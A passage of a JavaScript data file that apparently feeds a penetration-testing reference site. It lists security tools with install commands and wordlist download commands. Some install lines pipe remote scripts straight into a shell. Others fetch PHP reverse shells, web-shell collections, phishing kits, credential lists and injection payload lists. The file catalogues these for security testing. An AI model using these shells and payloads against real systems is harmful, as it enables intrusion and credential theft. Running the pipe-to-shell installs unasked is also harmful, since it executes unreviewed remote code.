        link: 'http://www.ollydbg.de',
        linkLabel: 'Website',
        installation: ['Windows only']
    },
    {
        name: 'x64dbg',
        category: 'Reverse Engineering',
        link: 'https://x64dbg.com',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'Hopper',
        category: 'Reverse Engineering',
        link: 'https://www.hopperapp.com',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'dnSpy',
        category: 'Reverse Engineering',
        link: 'https://github.com/dnSpy/dnSpy',
        linkLabel: 'GitHub',
        installation: ['Download from GitHub releases']
    },
    {
        name: 'ILSpy',
        category: 'Reverse Engineering',
        link: 'https://github.com/icsharpcode/ILSpy',
        linkLabel: 'GitHub',
        installation: ['Download from GitHub releases']
    },
    {
        name: 'JD-GUI',
        category: 'Reverse Engineering',
        link: 'https://github.com/java-decompiler/jd-gui',
        linkLabel: 'GitHub',
        installation: ['Download from GitHub releases']
    },
    {
        name: 'JADX',
        category: 'Reverse Engineering',
        link: 'https://github.com/skylot/jadx',
        linkLabel: 'GitHub',
        installation: ['Download from GitHub releases']
    },
    {
        name: 'APKTool',
        category: 'Reverse Engineering',
        link: 'https://ibotpeaches.github.io/Apktool/',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'Cutter',
        category: 'Reverse Engineering',
        link: 'https://github.com/rizinorg/cutter',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install cutter -y']
    },
    {
        name: 'Binwalk',
        category: 'Reverse Engineering',
        link: 'https://github.com/ReFirmLabs/binwalk',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install binwalk -y']
    },
    {
        name: 'Strings',
        category: 'Reverse Engineering',
        link: 'https://linux.die.net/man/1/strings',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install binutils -y']
    },
    {
        name: 'ltrace',
        category: 'Reverse Engineering',
        link: 'https://linux.die.net/man/1/ltrace',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install ltrace -y']
    },
    {
        name: 'strace',
        category: 'Reverse Engineering',
        link: 'https://linux.die.net/man/1/strace',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install strace -y']
    },
    {
        name: 'GDB',
        category: 'Reverse Engineering',
        link: 'https://www.gnu.org/software/gdb/',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install gdb -y']
    },
    {
        name: 'PEDA',
        category: 'Reverse Engineering',
        link: 'https://github.com/longld/peda',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/longld/peda.git ~/peda']
    },
    {
        name: 'GEF',
        category: 'Reverse Engineering',
        link: 'https://github.com/hugsy/gef',
        linkLabel: 'GitHub',
        installation: ['bash -c "$(curl -fsSL https://gef.blah.cat/sh)"']
    },

    // ===== FORENSICS =====
    {
        name: 'Autopsy',
        category: 'Forensics',
        link: 'https://www.autopsy.com',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'Volatility',
        category: 'Forensics',
        link: 'https://github.com/volatilityfoundation/volatility',
        linkLabel: 'GitHub',
        installation: ['pip3 install volatility3']
    },
    {
        name: 'FTK Imager',
        category: 'Forensics',
        link: 'https://www.exterro.com/ftk-imager',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'Sleuth Kit',
        category: 'Forensics',
        link: 'https://www.sleuthkit.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install sleuthkit -y']
    },
    {
        name: 'Foremost',
        category: 'Forensics',
        link: 'http://foremost.sourceforge.net',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install foremost -y']
    },
    {
        name: 'Scalpel',
        category: 'Forensics',
        link: 'https://github.com/sleuthkit/scalpel',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install scalpel -y']
    },
    {
        name: 'Bulk Extractor',
        category: 'Forensics',
        link: 'https://github.com/simsong/bulk_extractor',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install bulk-extractor -y']
    },
    {
        name: 'Exiftool',
        category: 'Forensics',
        link: 'https://exiftool.org',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install exiftool -y']
    },
    {
        name: 'Steghide',
        category: 'Forensics',
        link: 'http://steghide.sourceforge.net',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install steghide -y']
    },
    {
        name: 'Binwalk',
        category: 'Forensics',
        link: 'https://github.com/ReFirmLabs/binwalk',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install binwalk -y']
    },

    // ===== MOBILE =====
    {
        name: 'Frida',
        category: 'Mobile',
        link: 'https://frida.re',
        linkLabel: 'Website',
        installation: ['pip3 install frida-tools']
    },
    {
        name: 'Objection',
        category: 'Mobile',
        link: 'https://github.com/sensepost/objection',
        linkLabel: 'GitHub',
        installation: ['pip3 install objection']
    },
    {
        name: 'MobSF',
        category: 'Mobile',
        link: 'https://github.com/MobSF/Mobile-Security-Framework-MobSF',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git']
    },
    {
        name: 'Drozer',
        category: 'Mobile',
        link: 'https://github.com/WithSecureLabs/drozer',
        linkLabel: 'GitHub',
        installation: ['pip3 install drozer']
    },
    {
        name: 'APKTool',
        category: 'Mobile',
        link: 'https://ibotpeaches.github.io/Apktool/',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'JADX',
        category: 'Mobile',
        link: 'https://github.com/skylot/jadx',
        linkLabel: 'GitHub',
        installation: ['Download from GitHub releases']
    },
    {
        name: 'ADB',
        category: 'Mobile',
        link: 'https://developer.android.com/studio/command-line/adb',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install android-tools-adb -y']
    },

    // ===== CLOUD =====
    {
        name: 'ScoutSuite',
        category: 'Cloud',
        link: 'https://github.com/nccgroup/ScoutSuite',
        linkLabel: 'GitHub',
        installation: ['pip3 install scoutsuite']
    },
    {
        name: 'Prowler',
        category: 'Cloud',
        link: 'https://github.com/prowler-cloud/prowler',
        linkLabel: 'GitHub',
        installation: ['pip3 install prowler-cloud']
    },
    {
        name: 'CloudSploit',
        category: 'Cloud',
        link: 'https://github.com/aquasecurity/cloudsploit',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/aquasecurity/cloudsploit.git']
    },
    {
        name: 'Pacu',
        category: 'Cloud',
        link: 'https://github.com/RhinoSecurityLabs/pacu',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/RhinoSecurityLabs/pacu.git', 'cd pacu && bash install.sh']
    },
    {
        name: 'CloudFox',
        category: 'Cloud',
        link: 'https://github.com/BishopFox/cloudfox',
        linkLabel: 'GitHub',
        installation: ['go install github.com/BishopFox/cloudfox@latest']
    },
    {
        name: 'AWS CLI',
        category: 'Cloud',
        link: 'https://aws.amazon.com/cli/',
        linkLabel: 'Website',
        installation: ['pip3 install awscli']
    },
    {
        name: 'Azure CLI',
        category: 'Cloud',
        link: 'https://docs.microsoft.com/en-us/cli/azure/',
        linkLabel: 'Website',
        installation: ['curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash']
    },
    {
        name: 'GCP CLI',
        category: 'Cloud',
        link: 'https://cloud.google.com/sdk/gcloud',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'S3Scanner',
        category: 'Cloud',
        link: 'https://github.com/sa7mon/S3Scanner',
        linkLabel: 'GitHub',
        installation: ['pip3 install s3scanner']
    },
    {
        name: 'CloudMapper',
        category: 'Cloud',
        link: 'https://github.com/duo-labs/cloudmapper',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/duo-labs/cloudmapper.git']
    },
    {
        name: 'ROADtools',
        category: 'Cloud',
        link: 'https://github.com/dirkjanm/ROADtools',
        linkLabel: 'GitHub',
        installation: ['pip3 install roadrecon']
    },
    {
        name: 'AzureHound',
        category: 'Cloud',
        link: 'https://github.com/BloodHoundAD/AzureHound',
        linkLabel: 'GitHub',
        installation: ['go install github.com/BloodHoundAD/AzureHound/v2@latest']
    },
    {
        name: 'MicroBurst',
        category: 'Cloud',
        link: 'https://github.com/NetSPI/MicroBurst',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/NetSPI/MicroBurst.git']
    },

    // ===== CONTAINER =====
    {
        name: 'Trivy',
        category: 'Container',
        link: 'https://github.com/aquasecurity/trivy',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install trivy -y']
    },
    {
        name: 'Docker Bench',
        category: 'Container',
        link: 'https://github.com/docker/docker-bench-security',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/docker/docker-bench-security.git']
    },
    {
        name: 'Clair',
        category: 'Container',
        link: 'https://github.com/quay/clair',
        linkLabel: 'GitHub',
        installation: ['Docker image']
    },
    {
        name: 'Anchore',
        category: 'Container',
        link: 'https://github.com/anchore/anchore-engine',
        linkLabel: 'GitHub',
        installation: ['pip3 install anchorecli']
    },
    {
        name: 'Kube-hunter',
        category: 'Container',
        link: 'https://github.com/aquasecurity/kube-hunter',
        linkLabel: 'GitHub',
        installation: ['pip3 install kube-hunter']
    },
    {
        name: 'Kube-bench',
        category: 'Container',
        link: 'https://github.com/aquasecurity/kube-bench',
        linkLabel: 'GitHub',
        installation: ['Download from GitHub releases']
    },
    {
        name: 'kubectl',
        category: 'Container',
        link: 'https://kubernetes.io/docs/tasks/tools/',
        linkLabel: 'Website',
        installation: ['sudo apt update && sudo apt install kubectl -y']
    },

    // ===== MISC =====
    {
        name: 'Metabigor',
        category: 'OSINT',
        link: 'https://github.com/j3ssie/metabigor',
        linkLabel: 'GitHub',
        installation: ['go install github.com/j3ssie/metabigor@latest']
    },
    {
        name: 'SpiderFoot',
        category: 'OSINT',
        link: 'https://github.com/smicallef/spiderfoot',
        linkLabel: 'GitHub',
        installation: ['pip3 install spiderfoot']
    },
    {
        name: 'Maltego',
        category: 'OSINT',
        link: 'https://www.maltego.com',
        linkLabel: 'Website',
        installation: ['Download from website']
    },
    {
        name: 'FOCA',
        category: 'OSINT',
        link: 'https://github.com/ElevenPaths/FOCA',
        linkLabel: 'GitHub',
        installation: ['Windows only']
    },
    {
        name: 'Sherlock',
        category: 'OSINT',
        link: 'https://github.com/sherlock-project/sherlock',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/sherlock-project/sherlock.git', 'cd sherlock && pip3 install -r requirements.txt']
    },
    {
        name: 'Social-Engineer Toolkit',
        category: 'Social Engineering',
        link: 'https://github.com/trustedsec/social-engineer-toolkit',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/', 'cd setoolkit && pip3 install -r requirements.txt']
    },
    {
        name: 'Evilginx2',
        category: 'Social Engineering',
        link: 'https://github.com/kgretzky/evilginx2',
        linkLabel: 'GitHub',
        installation: ['go install github.com/kgretzky/evilginx2@latest']
    },
    {
        name: 'GoPhish',
        category: 'Social Engineering',
        link: 'https://github.com/gophish/gophish',
        linkLabel: 'GitHub',
        installation: ['Download from GitHub releases']
    },
    {
        name: 'King Phisher',
        category: 'Social Engineering',
        link: 'https://github.com/rsmusllp/king-phisher',
        linkLabel: 'GitHub',
        installation: ['git clone https://github.com/rsmusllp/king-phisher.git']
    },
    {
        name: 'CyberChef',
        category: 'Utilities',
        link: 'https://gchq.github.io/CyberChef/',
        linkLabel: 'Website',
        installation: ['Online tool']
    },
    {
        name: 'CrackMapExec',
        category: 'Utilities',
        link: 'https://github.com/byt3bl33d3r/CrackMapExec',
        linkLabel: 'GitHub',
        installation: ['pipx install crackmapexec']
    },
    {
        name: 'Tmux',
        category: 'Utilities',
        link: 'https://github.com/tmux/tmux',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install tmux -y']
    },
    {
        name: 'Terminator',
        category: 'Utilities',
        link: 'https://github.com/gnome-terminator/terminator',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install terminator -y']
    },
    {
        name: 'Oh My Zsh',
        category: 'Utilities',
        link: 'https://ohmyz.sh',
        linkLabel: 'Website',
        installation: ['sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"']
    },
    {
        name: 'Searchsploit',
        category: 'Utilities',
        link: 'https://github.com/offensive-security/exploitdb',
        linkLabel: 'GitHub',
        installation: ['sudo apt update && sudo apt install exploitdb -y']
    }
];


const WORDLISTS = [
    // ===== CREDENTIALS =====
    {
        name: 'RockYou',
        category: 'Credentials',
        command: 'sudo gunzip /usr/share/wordlists/rockyou.txt.gz',
        note: 'Default Kali location'
    },
    {
        name: 'RockYou (Download)',
        category: 'Credentials',
        command: 'wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'
    },
    {
        name: 'SecLists - 10K Most Common',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -O passwords-10k.txt'
    },
    {
        name: 'SecLists - 100K Most Common',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt -O passwords-100k.txt'
    },
    {
        name: 'SecLists - 1M Most Common',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -O passwords-1m.txt'
    },
    {
        name: 'SecLists - 10M Usernames',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt -O usernames-10m.txt'
    },
    {
        name: 'SecLists - Common Usernames',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt -O usernames-short.txt'
    },
    {
        name: 'SecLists - Names',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt -O names.txt'
    },
    {
        name: 'SecLists - Default Credentials',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/default-passwords.csv -O default-passwords.csv'
    },
    {
        name: 'SecLists - SSH Default Passwords',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -O ssh-defaults.txt'
    },
    {
        name: 'SecLists - SNMP Community Strings',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/snmp.txt -O snmp-community.txt'
    },
    {
        name: 'Probable Wordlists',
        category: 'Credentials',
        command: 'wget https://github.com/berzerk0/Probable-Wordlists/raw/master/Real-Passwords/Top12Thousand-probable-v2.txt'
    },
    {
        name: 'Weakpass',
        category: 'Credentials',
        command: 'wget https://weakpass.com/wordlist/1851',
        note: 'Requires registration'
    },
    {
        name: 'CrackStation Dictionary',
        category: 'Credentials',
        command: 'wget https://crackstation.net/files/crackstation.txt.gz && gunzip crackstation.txt.gz'
    },
    {
        name: 'Hashesorg',
        category: 'Credentials',
        command: 'wget https://download.weakpass.com/wordlists/90/hashesorg2019.txt'
    },
    // ===== WEB CONTENT =====
    {
        name: 'SecLists - Common.txt',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -O common.txt'
    },
    {
        name: 'SecLists - Directory List 2.3 Small',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-small.txt -O directory-list-2.3-small.txt'
    },
    {
        name: 'SecLists - Directory List 2.3 Medium',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-medium.txt -O directory-list-2.3-medium.txt'
    },
    {
        name: 'SecLists - Directory List 2.3 Big',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-big.txt -O directory-list-2.3-big.txt'
    },
    {
        name: 'SecLists - Big.txt',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt -O big.txt'
    },
    {
        name: 'SecLists - Raft Large Files',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-large-files.txt -O raft-large-files.txt'
    },
    {
        name: 'SecLists - Raft Large Directories',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-large-directories.txt -O raft-large-directories.txt'
    },
    {
        name: 'SecLists - Raft Large Words',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-large-words.txt -O raft-large-words.txt'
    },
    {
        name: 'SecLists - API Endpoints',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints.txt -O api-endpoints.txt'
    },
    {
        name: 'SecLists - CGI Scripts',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CGIs.txt -O cgis.txt'
    },
    {
        name: 'SecLists - Apache',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Apache.fuzz.txt -O apache-fuzz.txt'
    },
    {
        name: 'SecLists - IIS',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt -O iis-fuzz.txt'
    },
    {
        name: 'SecLists - Tomcat',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt -O tomcat.txt'
    },
    {
        name: 'SecLists - WordPress',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt -O wordpress-fuzz.txt'
    },
    {
        name: 'SecLists - Joomla',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CMS/joomla.txt -O joomla.txt'
    },
    {
        name: 'SecLists - Drupal',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CMS/drupal.txt -O drupal.txt'
    },
    {
        name: 'SecLists - SharePoint',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CMS/sharepoint.txt -O sharepoint.txt'
    },
    {
        name: 'SecLists - Spring Boot',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/spring-boot.txt -O spring-boot.txt'
    },
    {
        name: 'SecLists - Swagger',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/swagger.txt -O swagger.txt'
    },
    {
        name: 'SecLists - GraphQL',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/graphql.txt -O graphql.txt'
    },
    {
        name: 'SecLists - Quickhits',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/quickhits.txt -O quickhits.txt'
    },
    {
        name: 'Assetnote Wordlists - Best DNS',
        category: 'Web Content',
        command: 'wget https://wordlists-cdn.assetnote.io/data/manual/best-dns-wordlist.txt -O assetnote-dns.txt'
    },
    {
        name: 'Assetnote Wordlists - 2M Subdomains',
        category: 'Web Content',
        command: 'wget https://wordlists-cdn.assetnote.io/data/manual/2m-subdomains.txt -O assetnote-2m-subdomains.txt'
    },
    {
        name: 'Jhaddix All.txt',
        category: 'Web Content',
        command: 'wget https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt -O jhaddix-all.txt'
    },
    {
        name: 'Jhaddix Content Discovery',
        category: 'Web Content',
        command: 'wget https://gist.githubusercontent.com/jhaddix/b80ea67d85c13206125806f0828f4d10/raw/c81a34fe84731430741e0463eb6076129c20c4c0/content_discovery_all.txt -O jhaddix-content-discovery.txt'
    },
    {
        name: 'Bug Bounty Wordlist',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/xyele/hackerone_wordlist/main/wordlists/h1_wordlist.txt -O h1-wordlist.txt'
    },
    {
        name: 'OneListForAll',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/six2dez/OneListForAll/main/onelistforallshort.txt -O onelistforall.txt'
    },
    {
        name: 'Bo0oM Fuzz.txt',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/Bo0oM/fuzz.txt/master/fuzz.txt -O bo0om-fuzz.txt'
    },

    // ===== DNS =====
    {
        name: 'SecLists - DNS Subdomains Top 20K',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-20000.txt -O subdomains-top20k.txt'
    },
    {
        name: 'SecLists - DNS Subdomains Top 5K',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -O subdomains-top5k.txt'
    },
    {
        name: 'SecLists - DNS Subdomains Top 110K',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt -O subdomains-top110k.txt'
    },
    {
        name: 'SecLists - BitQuark Subdomains',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/bitquark-subdomains-top100000.txt -O bitquark-subdomains.txt'
    },
    {
        name: 'SecLists - Fierce Hostlist',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/fierce-hostlist.txt -O fierce-hostlist.txt'
    },
    {
        name: 'SecLists - DNS Names',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/dns-Jhaddix.txt -O dns-jhaddix.txt'
    },
    {
        name: 'SecLists - Deepmagic',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/deepmagic.com-prefixes-top50000.txt -O deepmagic-top50k.txt'
    },
    {
        name: 'SecLists - N0kovo Subdomains',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/n0kovo_subdomains.txt -O n0kovo-subdomains.txt'
    },
    {
        name: 'SecLists - Sorted Subdomains',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/sorted_knock_dnsrecon_fierce_recon-ng.txt -O sorted-subdomains.txt'
    },
    {
        name: 'DNSCewl',
        category: 'DNS',
        command: 'git clone https://github.com/codingo/DNSCewl.git',
        note: 'Tool to generate DNS wordlists'
    },

    // ===== FUZZING =====
    {
        name: 'SecLists - LFI Linux',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -O lfi-linux.txt'
    },
    {
        name: 'SecLists - LFI Windows',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -O lfi-windows.txt'
    },
    {
        name: 'SecLists - LFI Interesting',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt -O lfi-jhaddix.txt'
    },
    {
        name: 'SecLists - XSS Payloads',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt -O xss-payloads.txt'
    },
    {
        name: 'SecLists - XSS PolyGlots',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Polyglots/XSS-Polyglots.txt -O xss-polyglots.txt'
    },
    {
        name: 'SecLists - SQL Injection',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt -O sqli-payloads.txt'
    },
    {
        name: 'SecLists - SQL Injection Auth Bypass',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/quick-SQLi.txt -O sqli-auth-bypass.txt'
    },
    {
        name: 'SecLists - NoSQL Injection',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/NoSQL.txt -O nosqli-payloads.txt'
    },
    {
        name: 'SecLists - Command Injection',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/command-injection-commix.txt -O command-injection.txt'
    },
    {
        name: 'SecLists - LDAP Injection',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LDAP.txt -O ldap-injection.txt'
    },
    {
        name: 'SecLists - Template Injection',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/template-engines-expression.txt -O ssti-payloads.txt'
    },
    {
        name: 'SecLists - XXE Payloads',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XXE-Fuzzing.txt -O xxe-payloads.txt'
    },
    {
        name: 'SecLists - SSRF',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SSRF-URLs-with-Internal-IPs.txt -O ssrf-payloads.txt'
    },
    {
        name: 'SecLists - IDOR',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/IDOR.txt -O idor-payloads.txt'
    },
    {
        name: 'SecLists - Special Characters',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/special-chars.txt -O special-chars.txt'
    },
    {
        name: 'SecLists - Unicode',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Unicode.txt -O unicode.txt'
    },
    {
        name: 'SecLists - HTTP Verbs',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/http-request-headers.txt -O http-verbs.txt'
    },
    {
        name: 'SecLists - User Agents',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/User-Agents/UserAgents.fuzz.txt -O user-agents.txt'
    },
    {
        name: 'FuzzDB - Discovery',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt -O fuzzdb-raft-files.txt'
    },
    {
        name: 'FuzzDB - Attack Patterns',
        category: 'Fuzzing',
        command: 'git clone https://github.com/fuzzdb-project/fuzzdb.git',
        note: 'Comprehensive fuzzing database'
    },

    // ===== PAYLOADS & SHELLS =====
    {
        name: 'PayloadsAllTheThings',
        category: 'Payloads',
        command: 'git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git'
    },
    {
        name: 'SecLists - Web Shells',
        category: 'Payloads',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/laudanum-0.8/php/php-reverse-shell.php -O php-reverse-shell.php'
    },
    {
        name: 'PentestMonkey Reverse Shells',
        category: 'Payloads',
        command: 'wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php'
    },
    {
        name: 'SecLists - Reverse Shells',
        category: 'Payloads',
        command: 'git clone https://github.com/danielmiessler/SecLists.git && cd SecLists/Web-Shells'
    },
    {
        name: 'Laudanum Shells',
        category: 'Payloads',
        command: 'git clone https://github.com/jbarcia/Web-Shells.git'
    },

    // ===== MISCELLANEOUS =====
    {
        name: 'SecLists - Malicious URLs',
        category: 'Malware',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/URLs/url-malware-database.txt -O malware-urls.txt'
    },
    {
        name: 'SecLists - File Extensions',
        category: 'Files',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-extensions.txt -O file-extensions.txt'
    },
    {
        name: 'SecLists - Interesting Files',
        category: 'Files',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/AdobeCQ-AEM.txt -O interesting-files.txt'
    },
    {
        name: 'SecLists - Backup Files',
        category: 'Files',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Common-DB-Backups.txt -O backup-files.txt'
    },
    {
        name: 'SecLists - Log Files',
        category: 'Files',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CommonLogLocations.txt -O log-locations.txt'
    },
    {
        name: 'SecLists - Interesting Keywords',
        category: 'Keywords',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt -O parameter-names.txt'
    },
    {
        name: 'SecLists - HTTP Status Codes',
        category: 'HTTP',
